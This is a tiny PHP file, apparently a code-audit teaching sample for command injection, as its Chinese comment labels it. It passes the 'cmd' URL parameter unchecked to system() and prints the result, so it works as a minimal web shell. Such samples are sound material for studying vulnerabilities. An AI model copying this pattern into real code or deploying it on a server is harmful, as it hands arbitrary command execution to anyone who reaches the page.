<?php
//代码审计命令注入
$action = $_GET['cmd'];
echo "<pre>";
system($action);
echo "<pre>";
?>